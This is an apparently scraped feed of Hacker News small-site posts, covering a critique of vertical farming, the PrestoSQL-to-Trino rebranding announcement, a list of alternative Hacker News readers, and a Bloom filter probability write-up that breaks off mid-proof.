great. Why not <em>completely</em> eliminate food miles, and grow food right next to restaurants, cafeterias, or supermarkets? And why not grow crops inside closed systems, where water can be recycled, and pests can (in theory) be managed without chemicals.</p><p id="d5c4">It sounds great, doesn’t it? But there are many challenges.</p></div></div></section><section><div><div><p id="6ba8"><span>F</span><strong>irst, Vertical Farms Cost a Fortune</strong></p><p id="5f2b">But there are costs to these farms. <em>Huge</em> costs.</p><p id="f0bc">First, these systems are <em>really</em> expensive to build. The shipping container systems developed by <a href="http://www.freightfarms.com/faq/" rel="noopener">Freight Farms</a>, for example, cost between $82,000 and $85,000 <em>per container</em> — an astonishing sum for a box that just grows greens and herbs. Just one container costs as much as 10 entire acres of prime American farmland — which is a far better investment, both in terms of food production and future economic value. Just remember: farmland has the benefit of generally <em>appreciating</em> in <a href="http://www.forbes.com/sites/joshuarogers/2014/09/23/dirt-cheap-investors-are-plowing-into-farmland-heres-why" rel="noopener">value over time</a>, whereas a big metal box is likely to only decrease in value.</p><p id="24cf">Second, food produced this way is <em>very</em> expensive. For example, the Wall Street Journal <a href="http://www.wsj.com/articles/are-shipping-containers-the-future-of-farming-1465393797" rel="noopener">reports</a> that mini-lettuces grown by Green Line Growers costs more than <em>twice</em> as much as organic lettuce available in most stores. And this is typical for other indoor growers around the country: it’s very, very expensive, even compared to organic food. Instead of making food <em>more</em>available, especially to poorer families on limited budgets, these indoor crops are only available to the affluent. It might be fine for gourmet lettuce, or fancy greens for expensive restaurants, but regular folks may find it out of reach.</p><p id="e121">Finally, indoor farms use <em>a lot</em> of energy and materials to operate. The container farms from Freight Farms, for example, use about <a href="http://www.freightfarms.com/faq/" rel="noopener">80 kilowatt-hours of electricity a day</a> to power the lights and pumps. That’s nearly 2–3 times as much electricity as a typical (and still very inefficient) American home, or about 8 times the electricity used by an average San Francisco apartment. And on the average American electrical grid, this translates to emitting <em>44,000 pounds of CO2 per container per year</em>, from electricity alone, not counting any additional heating costs. This is <em>vastly</em> more than the emissions it would take to ship the food from someplace else.</p><p id="0e49">And none of it is necessary.</p></div></div></section><section><div><div><p id="1017"><span>B</span><strong>ut, Wait, Can’t Indoor Farms Use Renewable Energy?</strong></p><p id="5bbd">Proponents of indoor techno-farms often say that they can offset the enormous sums of electricity they use, by powering them with renewable energy — especially solar panels — to make the whole thing carbon neutral.</p><p id="5b5d">But just stop and think about this for a second.</p><p id="5f6a">These indoor “farms” would use solar panels to harvest naturally occurring sunlight, and convert it into electricity, so that they can power…<em>artificial sunlight</em>? In other words<em>, </em>they’re<em> trying to use the sun to replace the sun.</em></p><p id="0a0f">But we don’t need to replace the sun. Of all of the things we should worry about in agriculture, the availability of free sunlight is not one of them. Any system that seeks to replace the sun to grow food is probably a bad idea.</p></div></div></section><section><div><div><p id="e3d3"><span>B</span><strong>esides, “Food Miles” Aren’t a Big Climate Problem</strong></p><p id="29a5">Sometimes we hear that vertical farms help the environment by reducing “food miles” — the distance food items travel from farm to table — and thereby reduce fuel consumption and greenhouse gas emissions.</p><p id="0f7a">This sounds logical, but it turns out to be a red herring.</p><p id="c2ec">Strange as it might seem, local food typically uses about the same amount of energy — per pound — to transport as food grown far away. Why? Short answer: volume and method of transport. A larger food operator can ship food more efficiently — even if it travels longer distances — because of the gigantic volumes they work in. Plus, ships, trains, and even large trucks driving on Interstate highways use less fuel, per pound per mile, than small trucks driving around town.</p><p id="a654">Plus it turns out that “food miles” aren’t a very big source of CO2 emissions anyway, whether they’re local or not. In fact, they pale in comparison to emissions from deforestation, methane from cattle and rice fields, and nitrous oxide from over-fertilized fields. And local food systems — especially organic farms that use fewer fertilizers, and grass fed beef that sequesters carbon in the soil — can reduce these more critical emissions. At the end of the day, local food systems are generally better for the environment, including greenhouse gas emissions. Just don’t worry about emissions from food miles too much.</p></div></div></section><section><div><div><p id="6153"><span>A</span><strong>nd These Vertical “Farms” Can’t Grow Much</strong></p><p id="1ac1">A further problem with indoor farms is that a lot of crops could never develop properly in these artificial conditions. While LED lights provide the light needed for <em>photosynthesis</em> to occur, they don’t provide the proper mix of light and heat to trigger plant development stages — like those that tell plants when to put on fruit or seed. Moreover, a lot of crops need a bit of wind to develop tall, strong stalks, needed later when they are carrying heavy loads before harvest. As a result, indoor farms are severely limited, and have a hard time growing things besides simple greens.</p><p id="71b1">Indoor farms might be able to provide some <em>garnish</em> and <em>salads</em> to the world, but forget about them as a means of growing much other <em>food</em>.</p></div></div></section><section><div><div><p id="003c"><strong>A Better Way?</strong></p><p id="bf8f">I’m not the only critic of indoor, high-tech, energy-intensive agriculture. Other authors are starting to point out the problems with these systems too (read very good critiques <a href="http://www.salon.com/2016/02/17/enough_with_the_vertical_farming_partner/" rel="noopener">here</a>, <a href="http://www.counterpunch.org/2012/12/11/the-vertical-farming-scam/" rel="noopener">here</a>, <a href="https://www.theguardian.com/sustainable-business/2015/apr/10/indoor-farming-makes-no-economic-environmental-sense" rel="noopener">here</a>, and <a href="http://news.cornell.edu/stories/2014/02/indoor-urban-farms-called-wasteful-pie-sky" rel="noopener">here</a>).</p><p id="02f4">While I appreciate the enthusiasm and innovation put into developing indoor farms, I think these efforts are, at the end of the day, counterproductive.</p><p id="8dea">Instead, I think we should use the same investment of dollars, incredible technology, and amazing brains to solve other agricultural problems — like developing new methods for drip irrigation, better grazing systems that lock up soil carbon, and ways of recycling on-farm nutrients. Organic farming and high-precision agriculture are doing promising things, and need more help. We also need innovation and capital to help other parts of the food system, especially in tackling food waste, and getting people to shift their diets towards more sustainable directions.</p><p id="9534">An interconnected network of good farms —real farms that provide nutritious food, with social and environmental benefits to their communities — is the kind of innovation we really need.</p></div></div></section><section><div><p id="b135">NOTE: parts of this piece were adapted from an earlier blog article of mine called <em>“Local Food is Great, But Can It Go Too Far?”</em></p></div></section><section><div><div><p id="68aa"><em>Dr. </em><a href="http://globalecoguy.org/" rel="noopener"><em>Jonathan Foley</em></a><em> (@</em><a href="http://twitter.com/@globalecoguy" rel="noopener"><em>GlobalEcoGuy</em></a><em>) is a climate &amp; environmental scientist, writer, and speaker. He is also the Executive Director of </em><a href="http://drawdown.org/" rel="noopener"><em>Project Drawdown</em></a><em>, the world’s leading resource for climate solutions.</em></p><p id="10de"><em>These views are his own.</em></p><p id="db28">Copyright © 2015–2020, Jonathan Foley. All rights reserved.</p></div></div></section></div></div>]]>
            </description>
            <link>https://globalecoguy.org/no-vertical-farms-wont-feed-the-world-5313e3e961c0</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557407</guid>
            <pubDate>Mon, 28 Dec 2020 07:20:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Flurly now supports redirect URLs]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557325">thread link</a>) | @flurly
<br/>
December 27, 2020 | https://flurly.com/blog/redirect | <a href="https://web.archive.org/web/*/https://flurly.com/blog/redirect">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This means, when a customer makes a purchase, instead of taking them to a Flurly download page, you can automatically redirect them to your website for product fufillment. Take a look and give it a try in your settings page <a href="https://flurly.com/dashboard/settings">https://flurly.com/dashboard/settings</a></p>
<p><img src="https://flurly.com/images/redirect.png" alt="Image of Redirect URL"></p>
</div></div>]]>
            </description>
            <link>https://flurly.com/blog/redirect</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557325</guid>
            <pubDate>Mon, 28 Dec 2020 06:57:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We’re Rebranding PrestoSQL as Trino]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557321">thread link</a>) | @addisonj
<br/>
December 27, 2020 | https://trino.io/blog/2020/12/27/announcing-trino.html | <a href="https://web.archive.org/web/*/https://trino.io/blog/2020/12/27/announcing-trino.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>We’re rebranding PrestoSQL as Trino. The software and the community you have come to love and depend on aren’t 
going anywhere, we are simply renaming. <strong>Trino is the new name for PrestoSQL</strong>, the project supported by the founders 
and creators of Presto® along with the major contributors – just under a shiny new name. And now you can find us here:</p>

<ul>
  <li>GitHub: <a href="https://github.com/trinodb/trino">https://github.com/trinodb/trino</a>. Please give it a <a href="https://github.com/trinodb/trino/blob/master/.github/star.png">star</a>!</li>
  <li>Twitter: <a href="https://twitter.com/trinodb">@trinodb</a></li>
  <li>Slack: <a href="https://trino.io/slack.html">https://trino.io/slack.html</a></li>
</ul>

<p>If you want to learn why we’re doing this, read on…</p>

<!--more-->

<p>In 2012, Dain, David and Martin joined the Facebook data infrastructure team. Together with Eric Hwang, we created 
Presto® to address the problems of low latency interactive analytics over Facebook’s massive Hadoop data warehouse. 
One of our non-negotiable conditions was for Presto® to be an open source project. Open source is in our DNA - we had 
all used and participated in open source projects to various degrees in the past, and we recognized the power of open 
communities and developers coming together to build successful software that can stand the test of time.</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/team.jpg" alt=""></p>

<p>Over the next six years, we worked hard to build a healthy open source community and ecosystem around the project. We 
worked with developers and users all over the world and welcomed them into the Presto® community. Presto® was on a path 
of increasing growth and success, in large part because of the contributions from developers across many fields and all 
over the world.</p>

<p>Unfortunately in 2018, it became clear that Facebook management wanted to have tighter control over the project and its 
future. This culminated with their decision to grant Facebook developers commit rights on the project without any prior 
experience in Presto®. We strongly believe that this kind of decision is not compatible with having a healthy, open 
community. Moreover, they made this decision by fiat without engaging the Presto® community. As a matter of principle, 
we had no choice but to leave Facebook in order to focus on making sure Presto® continued to be a successful project 
with an open, collaborative and independent community. In reality, the choice was easy.</p>

<p>We started the Presto Software Foundation in January 2019 as an independent entity to oversee the development of the 
software and community, continuing the meritocratic system that had been in place over the previous 6 years. The community 
quickly consolidated under this new home. We intentionally stayed unemployed over the next 10 months to focus on expanding 
and strengthening the community by working directly with major users and contributors, as well as reaching out to a wider 
group of users and developers across the globe. This resulted in new use cases and an injection of energy, making the 
project more vibrant than ever before as even more new users and developers became engaged. But, don’t take our word for 
it, let the data speak for itself:</p>

<p><img src="https://trino.io/assets/blog/trino-announcement/commits.png" alt=""></p>

<p>Months after this consolidation, Facebook decided to create a competing community using The Linux Foundation®. As a first 
action, Facebook applied for a trademark on Presto®. This was a surprising, norm-breaking move because up until that point, 
the Presto® name had been used without constraints by commercial and non-commercial products for over 6 years. In September 
of 2019, Facebook established the Presto Foundation at The Linux Foundation®, and immediately began working to enforce this 
new trademark. We spent the better part of the last year trying to agree to terms with Facebook and The Linux Foundation 
that would not negatively impact the community, but unfortunately we were unable to do so. The end result is that we must 
now change the name in a short period of time, with little ability to minimize user disruption.</p>

<p>On a personal note, and as the founders who named the project Presto® in the first place, this is an incredibly sad and 
disappointing turn of events. And while we will always have fondness for the name Presto®, we have come to accept that a 
name is just a name. To be frank, we’re tired of this endless distraction, and we intend to focus on what matters most 
and what we are best at doing – building high quality software everyone can rely on and fostering a healthy community 
of users and developers that build it and support it. We’re not going anywhere – we’re the same people, the same amazing 
software, under a new name: Trino.</p>

<p><strong>If you love this project, you already love Trino. ❤️</strong></p>


<p>Facebook is a registered trademark of Facebook Inc.  The Linux Foundation and Presto are trademarks of The Linux Foundation.</p>


  </div>

  
</article>

</div></div>]]>
            </description>
            <link>https://trino.io/blog/2020/12/27/announcing-trino.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557321</guid>
            <pubDate>Mon, 28 Dec 2020 06:55:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What the cyberoptimists got wrong – and what to do about it]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25557229">thread link</a>) | @pdkl95
<br/>
December 27, 2020 | https://media.ccc.de/v/rc3-11337-what_the_cyberoptimists_got_wrong_-_and_what_to_do_about_it | <a href="https://web.archive.org/web/*/https://media.ccc.de/v/rc3-11337-what_the_cyberoptimists_got_wrong_-_and_what_to_do_about_it">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=doctorow">doctorow</a>

</p>

<p><a href="https://media.ccc.de/c/rc3/main" rel="tag">main</a>
<a href="https://media.ccc.de/c/rc3/Ethics,%20Society%20&amp;%20Politics" rel="tag">Ethics, Society &amp; Politics</a>
Playlists:
<a href="https://media.ccc.de/v/rc3-11337-what_the_cyberoptimists_got_wrong_-_and_what_to_do_about_it/playlist">'rc3' videos starting here</a>
/
<a data-method="get" href="https://media.ccc.de/v/rc3-11337-what_the_cyberoptimists_got_wrong_-_and_what_to_do_about_it/audio">audio</a></p>
<!-- %h3 About -->
<p>They stole our future. Let's take it back.</p>

<p>Here at the end of the world, it's time to take stock. Is technology a force for good? Can it be? Was it ever? How did we end up with a world made up of "five websites, each filled with screenshots of text from the other four" (h/t Tom Eastman)? Should we worry that machine learning will take away our free will through A/B splitting and Big Five Personality Types? Where the fuck did all these Nazis come from? </p>

<h3>Download</h3>
<div>
<div>

<div>

<div>
<div>
<h4>These files contain multiple languages.</h4>
<p>
This Talk was translated into multiple languages. The files available
for download contain all languages as separate audio-tracks. Most
desktop video players allow you to choose between them.
</p>
<p>
Please look for "audio tracks" in your desktop video player.
</p>
</div>
</div>
</div>


</div>

</div>
<!-- %h3 Embed/Share -->

<h3>Tags</h3>

</div>





</div>]]>
            </description>
            <link>https://media.ccc.de/v/rc3-11337-what_the_cyberoptimists_got_wrong_-_and_what_to_do_about_it</link>
            <guid isPermaLink="false">hacker-news-small-sites-25557229</guid>
            <pubDate>Mon, 28 Dec 2020 06:33:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[HN Alternative UIs]]>
            </title>
            <description>
<![CDATA[
Score 156 | Comments 108 (<a href="https://news.ycombinator.com/item?id=25556990">thread link</a>) | @lgats
<br/>
December 27, 2020 | https://blog.luke.lol/tech/hacker-news-alternatives/ | <a href="https://web.archive.org/web/*/https://blog.luke.lol/tech/hacker-news-alternatives/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
<h2>News.YCombinator.com Readers</h2>
<p>Ranked by Alexa popularity.</p>
<p><a href="https://hn.algolia.com/">hn.algolia.com</a><br>
HackerNews with a search function and 16.8+ million posts indexed.<br>
Alexa: 8.7k</p>
<p><a href="http://popurls.com/">popurls.com</a><br>
Several news sites combined into a single newspaper-like feed<br>
Alexa: 87k</p>
<p><a href="https://upstract.com/">upstract.com</a><br>
News aggregator with paid features, includes HN<br>
Alexa: 137k</p>
<p><a href="https://hckrnews.com/">hckrnews.com</a><br>
HN posts organized by rolling, quarter-daily timeslots.<br>
Alexa: 178k</p>
<p><a href="https://pxlet.com/">pxlet.com</a><br>
Culmination of HN, Reddit, SlashDot, and other Tech-News Sites<br>
Alexa: 330k</p>
<p><a href="https://hackernewsletter.com/">hackernewsletter.com</a><br>
HN delivered via email<br>
Alexa: 581k</p>
<p><a href="https://old.thenews.im/">thenews.im&nbsp;</a><br>
Designer News, Product Hunt and Hacker News Mashup with easy-access to individual feeds<br>
Alexa: 960k</p>
<p><a href="http://www.daemonology.net/hn-daily/">daemonology.net</a><br>
Daily list of the top HN posts.<br>
Alexa: 971k</p>
<p><a href="http://n-gate.com/%3En-gate.com%3C/a%3E%3Cbr%20/%3EA%20weekly%20[human?]%20annotated%20digest%20of%20the%20top%20%E2%80%9CHacker%E2%80%9D%20%E2%80%9CNews%E2%80%9D%20posts%3Cbr%20/%3EAlexa:%202.5m%3C/p%3E%3Cp%3E%3Ca%20href=" https:="" hn.premii.com"="">hn.premii.com</a><br>
HN Mirror integrated with an on-page reader<br>
Alexa: 3m</p>
<p><a href="http://hnrankings.info/">hnrankings.info</a><br>
HN Ranking Charts<br>
Alexa: 4m</p>
<p><a href="https://hnews.xyz/">hnews.xyz</a><br>
HN Mirror with Webpage Screenshots [similar to tiledhn.com (<a href="https://web.archive.org/web/20200120125632/http://www.tiledhn.com/">RIP</a>)]<br>
Alexa: 5m</p>
<p><a href="https://hnsince.com/">hnsince.com</a><br>
Top HN posts since you last visited<br>
Alexa: 5.4m</p>
<p><a href="https://hackerweb.app/">hackerweb.app</a><br>
More mobile-friendly HN<br>
Alexa: 6.3m</p>
<p><a href="https://fullhn.com/">fullhn.com</a><br>
Front page of HN in a single page loaded with all articles. Great for loading up before you jump on a flight without wireless access.<br>
Alexa: 7m</p>
<p><a href="https://hackurls.com/">hackurls.com</a><br>
HN, proggit, reddit, toptal, hackaday, slashdot, techmeme, wired as separate feeds on a single page<br>
Alexa: 8.5m</p>
<p><a href="https://hackernewsmobile.com/">hackernewsmobile.com</a><br>
More mobile-friendly HN<br>
Alexa: 9.5m</p>
<p><a href="https://lopespm.github.io/hackernews-daily/">lopespm HN Daily</a><br>
HackerNews Daily – Culmination of top posts for the day<br>
Alexa: Unavailable</p>
<p><a href="https://www.wolfgangfaust.com/project/paper-hn/">wolfgangfaust HN Newspaper</a><br>
Newspaper themed HN<br>
Alexa: Unavailable</p>
<p><a href="https://thn.rakhim.org/">thn.rakhim.org</a><br>
30 random good HN posts from the past<br>
Alexa: Unavailable</p>
<p><a href="https://zvoid.org/hn">zvoid.org/hn</a><br>
Dark-themed HN reader<br>
Alexa: Unavailable</p>
<p><a href="https://hn.svelte.dev/">hn.svelte.dev</a><br>
mobile and dark mode friendly reader for HN<br>
Alexa: None</p>
<p><a href="https://hackernews.betacat.io/">hackernews.betacat.io</a><br>
Modern HN theme with website preview screenshots<br>
Alexa: None</p>
<p><a href="https://read.hn/">read.hn</a><br>
Another HN Reader view<br>
Alexa: None</p>
<p><a href="https://hnapp.com/">hnapp.com</a><br>
HN Advanced Search and monitoring tool<br>
Alexa: None</p>
<p><a href="http://hnpaper.forge.partlab.io/">hnpaper.forge.partlab.io</a><br>
HNPaper – bootstrap theme simple HN interface<br>
Alexa: Unavailable</p>
<p><a href="https://hack.ernews.info/">hack.ernews.info</a><br>
More mobile-friendly HN<br>
Alexa: None</p>
<p><a href="https://progscrape.com/">progscrape.com</a><br>
HN, Reddit, and Lobste.rs aggregated and merged into a single feed<br>
Alexa: None</p>
<p><a href="http://hn.elijames.org/">hn.elijames.org</a><br>
“Less annoying hacker news” with an even simpler interface<br>
Alexa: None</p>
<p><a href="http://serializer.io/">seralizer.io</a><br>
HN + Related Subreddits + Lobsters + Mac Rumors + Arstechnica<br>
Alexa: None</p>
<p><a href="https://nerdmash.com/">nerdmash.com</a><br>
A nerd’s daily read. Top posts from every nerdy content aggregator.<br>
Alexa: None</p>
<h2>Other Tweaks / Interfaces</h2>
<p><a href="https://old.reddit.com/r/hackernews/">/r/hackernews</a><br>
Subreddit for HN<br>
51,450 readers</p>
<p><a href="https://hnreplies.com/">hnreplies.com</a><br>
Emails on replies to your comments<br>
Alexa: 3.2m</p>
<p><a href="https://apps.apple.com/us/app/id1308885491">Octal iOS App</a><br>
Full-featured HN client with support for posting/voting/comments – iOS only.<br>
4.8/5.0 – 1K Ratings</p>
<p><a href="https://hnrss.github.io/">hnrss.github.io</a><br>
HN RSS Feed<br>
Alexa: None</p>
<p><a href="https://hackerne.ws/">hackerne.ws</a><br>
HN Short Link – redirects to https://news.ycombinator.com<br>
Alexa: None</p>
<p><a href="https://chrome.google.com/webstore/detail/hacker-news-ux/chngbdmhgakoomomnnhfapkpbalpmhid">Hacker News UX</a><br>
Chrome Extension for Improved UI<br>
356 users</p>
<p><a href="https://f5bot.com/">f5bot.com</a><br>
Reddit / HN / Lobsters keyword mention watch tool.<br>
Alexa: 1.1m</p>

<h2>Graveyard</h2>
<p>hackermonthly.com [<a href="https://web.archive.org/web/20160731192600/http://hackermonthly.com/">defunct</a>]<br>
HN in print</p>
<p>quiethn.com [<a href="https://web.archive.org/web/20171001013212/https://quiethn.com/">defunct</a>]<br>
HN with less clutter </p>
<p>hackerblogs.com [<a href="https://web.archive.org/web/20110204021331/http://www.hackerblogs.com/">defunct</a>]<br>
2011-era mobile view</p>
<p>hackernews.im [defunct]<br>
now <a href="https://hackernews.betacat.io/">hackernews.betacat.io</a></p>
<p>tiledhn.com [<a href="https://web.archive.org/web/20200120125632/http://www.tiledhn.com/">defunct</a>]<br>
Windows 8-type view for HN</p>
<p>hackerbra.in [<a href="https://web.archive.org/web/20181105131330/http://hackerbra.in/">defunct</a>]<br>
HN with inline top comments </p>
<p>hnwatcher.com [<a href="https://web.archive.org/web/20201125052525/https://www.hnwatcher.com/">defunct</a>]<br>
user/keyword email notification service</p>
<p>hnmobile.herokuapp.com [<a href="https://web.archive.org/web/20180601000346/http://hnmobile.herokuapp.com/">defunct</a>]<br>
HN mobile friendly mirror</p>
<p>hackernewsemail.com [<a href="https://web.archive.org/web/20180826215821/https://hackernewsemail.com/">defunct</a>]<br>
Daily email for posts with minimum set number of points</p>
<p>hacker-newspaper.gilesb.com [<a href="https://web.archive.org/web/20180402131152/https://news.ycombinator.com/">defunct</a>]<br>
HN Mirror</p>
<p>react-hn.appspot.com [<a href="https://web.archive.org/web/20181115204207/https://react-hn.appspot.com/">defunct</a>]<br>
HN Mirror</p>
<p>hackeroo.co [<a href="https://web.archive.org/web/20181115204207/https://react-hn.appspot.com/">defunct</a>]<br>
HN Mirror </p>
</div></div>]]>
            </description>
            <link>https://blog.luke.lol/tech/hacker-news-alternatives/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25556990</guid>
            <pubDate>Mon, 28 Dec 2020 05:37:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bloom Filter – Probability and Benchmarks]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25556713">thread link</a>) | @todsacerdoti
<br/>
December 27, 2020 | http://andybui01.github.io/bloom-filter/ | <a href="https://web.archive.org/web/*/http://andybui01.github.io/bloom-filter/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Bloom filters are a data structure which allows you to test whether an element exists in a set, with lower memory usage and better access times than other hash table implementations. It is probabilistic, and while it can guarantee negative matches, there is a slight chance it returns a false positive match. Through clever mathematical assumptions, we can produce constraints to minimise the chance of a false positive.</p>





<p><strong>Contents</strong></p>
<ol>
  <li><a href="#description">Description</a></li>
  <li><a href="#proof">Proof</a></li>
  <li><a href="#implementation-and-benchmarks">Implementation and benchmarks</a></li>
</ol>



<h2 id="description">Description</h2>

<p>Let there be a set of elements $N$, and we wish to store each element $e \in N$ in the set $F$. To do this, we introduce the set $K$ which has $k$ number of hash functions which hash the same element to <em>different</em> values.</p>

<p>In the following example, elements $x$ and $y$ are hashed by $k = 3$ hash functions.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/figure1.png" width="200"></p>

<p>Next, we introduce the bit array $M$ which has $m$ bits. This bit array is the underlying data structure that represents $F$, and we say an element $e$ is in $F$ if all of its corresponding bits (after hashing) in the bit array are set.</p>

<p>In the following image, $x$ is in $F$ hence all of its hashed bits within $M$ are set. Only one of $y$â€™s hashed bits are set so it is not in $F$. $x$ and $y$ are also sharing a bit at $M[4]$.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/figure2.png" width="400"></p>

<p>As we hash more elements from $N$, more bits are set to 1 in $M$ and eventually we get a <em>false positive</em> when testing set membership. This occurs when all of an elementâ€™s bits are set, although it was never inserted.</p>

<p>Consider the following scenario: $x$ and $y$ are in $F$, $z$ is not. However, $z$â€™s hashed bits are all set, giving the (false) impression that $z$ is in $F$.</p>

<p><img src="http://andybui01.github.io/images/bloom-filter/figure3.png" width="500"></p>

<p>Once an element is placed in $F$, it will remain there, as flipping bits to remove an element introduces the possibility of false negatives. We will show that there exists optimal parameters, $k$ hash functions and $m$ length bit array, to lower the false positive rate $\epsilon$.</p>



<h2 id="proof">Proof</h2>
<p>Note: This section is pretty math heavy, if you just want to look at the cool tables and graphs then you can skip ahead to <a href="#implementation-and-benchmarks">here</a>.</p>

<p>$\newcommand{\pbrac}[1]{\left(#1\right)}$
$\newcommand{\sbrac}[1]{\left[#1\right]}$</p>

<h3 id="first-attempt">First attempt</h3>
<p>Assume that a hash function in $K$ maps to each array position with <em>equal probability</em>. The probability that a bit is not set by a hash function during the insertion of an element is:</p>

<p>\begin{align}
    1 - \frac{1}{m}.
\end{align}</p>

<p>The probability that every hash function in $K$ leaves a certain bit at 0 will be</p>

<p>\begin{align}
    \left( 1 - \frac{1}{m} \right)^k \approx \ e^{-k/m}.
\end{align}</p>

<p>Thus, after inserting $n$ elements, the probability that a bit is <em>still</em> 0 is</p>

<p>\begin{align}
    \left( 1 - \frac{1}{m} \right)^{kn} \approx \ e^{-kn/m} \ = \ p,
\end{align}</p>

<p>and the probability that a bit is 1 after $n$ insertions is</p>

<p>\begin{align}
    \left( 1 - \left[ 1 - \frac{1}{m} \right]^{kn} \right) \approx \left( 1 - p \right).
\end{align}</p>

<p>Next, we test set membership for an element NOT in the set. Following $n$ insertions, each bit in the array has a chance of being set to 1 with the probability above. The probability that $k$ bits are set to 1, which would lead to a false positive result for set membership, is often referred to as the error/false positive rate:</p>

<p>\begin{align}
    \epsilon = \left( 1 - \left[ 1 - \frac{1}{m} \right]^{kn} \right)^k \approx \left( 1 - p \right)^k.
\end{align}</p>

<p>There exists a major problem with this analysis, however. At the start we made an assumption that all bits would be set randomly and independently. <strong>This is not correct</strong> as we have established that <em>all</em> our hash functions in $K$ will not hash an element to the same array position. For example, if we have hashed an element $m-1$ times into $m-1$ different positions, then the remaining $1$ bit in the array is guaranteed to be chosen, if we wish to retain an even spread of hashed values. Concretely, the $k$ bit array positions for each element are in fact <em>dependent</em>.</p>

<h3 id="another-try-using-poisson-approximations">Another try using Poisson approximations</h3>

<p>Consider a â€œballs and binsâ€� scenario where each throw of a ball into a bin is equivalent to hashing an element to an array position.</p>

<p>We have the following 2 cases:</p>
<ul>
  <li><strong>Exact case:</strong> $n$ balls are thrown into $m$ bins independently and uniformly at random</li>
  <li><strong>Poisson case:</strong> number of balls in each bin are taken to be independent Poisson random variables with an expected value</li>
</ul>

<p>Weâ€™ll be using the following corollaries from the book <em>â€œProbability and computing: randomization and probabilistic techniques in algorithms and data analysisâ€�</em> by Mitzenmacher and Upfal.</p>

<p><strong>Corollary 4.6:</strong> Let $X_1,â€¦,X_n$ be independent Poisson trials such that $P(X_i = 1) = p_i$. Let $X = \sum_{i=1}^{n} \text{ and } \mu = E(X)$. For $0 &lt; \delta &lt; 1$. [p. 71]
\begin{align}
    P\left(\left|X - \mu\right| \geq \delta \mu\right) \leq 2\exp{\left(-\frac{\mu\delta^2}{3}\right)}
\end{align}</p>

<p><strong>Corollary 5.9:</strong> any event that takes place with probability $p$ in the Poisson case takes place with probability at most $p e \sqrt{n}$ in the exact case. [p. 109]</p>

<p>Each bin corresponds to an array position and thus a bit being set to 0 is equivalent to an empty bin in our scenario. The fraction of bits being set to 0 after $n$ insertions is therefore equivalent to the fraction of empty bins after $kn$ balls have been thrown into $m$ bins.</p>

<p>We define $X$ as the number of empty bins after the balls have been thrown into $n$ bins, such that</p><p>

\[\begin{align}
    X =&amp; \ \sum_{i=1}^{n} X_i, \\
    \text{where } X_i =&amp; \
    \begin{cases}
        1 &amp; \text{if bin is empty} \\
        0 &amp; \text{otherwise}
    \end{cases}
\end{align}\]

</p><p>then we can define</p><p>

\[\begin{align}
    p' =&amp; \ \left( 1 - \frac{1}{m}\right)^{kn}, \\
    E(X) =&amp; \ mp'.
\end{align}\]

</p><p>In the Poisson case, each bin can be thought of as an independent Poisson random variable with expected value $pâ€™$. Therefore, we can apply \textbf{corollary 4.6} and $E(X) = \ mpâ€™$ to obtain the following:</p>

<p>\begin{align}
    P\left( \left| X - mpâ€™\right| \geq \delta mpâ€™\right) \ \leq&amp; \ 2\exp{\left(-\frac{mpâ€™\delta^2}{3}\right)}
\end{align}
Let $\delta \ = \ \beta / pâ€™, \ $choose small$ \ \beta$
\begin{align}
    \therefore \ P\left( \left| X - mpâ€™\right| \geq \beta m\right) \ \leq&amp; \ 2\exp{\left(-\frac{m\beta^2}{3pâ€™}\right)}
\end{align}</p>

<p>We then apply <strong>corollary 5.9</strong> to obtain</p><p>

\[\begin{align}
    P\left( \left| X - mp'\right| \geq \beta m\right) \ \leq&amp; \ 2e\sqrt{kn} \exp{\left(-\frac{m\beta^2}{3p'}\right)}\\
    \leq&amp; \ 0.000001 \ \text{when $m$ sufficiently large.}
\end{align}\]

</p><p>Essentially, taking the probability of an event using a Poisson approximation for all of the bins and multiplying it by $e\sqrt{kn}$ gives an upper bound for the probability of the event when $kn$ balls are thrown into $m$ bins (the exact case where events are independent).</p>

<p>This result tells us that when $m$ is sufficiently large, the fraction of empty bins $X/m$ is <em>very</em> close to $pâ€™$. And since $pâ€™ \approx p$ we can use $p$ to continue predicting actual performance.</p>

<h3 id="optimal-k">Optimal <em>k</em></h3>

<p>The false positive rate is $\epsilon = (1-p)^k$ and we look for a $k$ that minimizes $\epsilon$. Rearranging $\epsilon$ gives us</p><p>

\[\begin{align}
    \epsilon \ =&amp; \ \pbrac{1-p}^k \\
    =&amp; \ \exp{\pbrac{\ln{\pbrac{\sbrac{1-p}^k}}}} \\
    =&amp; \ \exp{\pbrac{k\ln{\pbrac{\sbrac{1-p}}}}} \\
    =&amp; \ \exp{\pbrac{k\ln{\pbrac{\sbrac{1-e^{-kn/m}}}}}}.
\end{align}\]

</p><p>If we let $g = k\ln{\pbrac{1-e^{-kn/m}}}$ so that $\epsilon = e^g$, then minimizing the false positive $\epsilon$ is equivalent to minimizing $g$ with respect to $k$. We have</p>

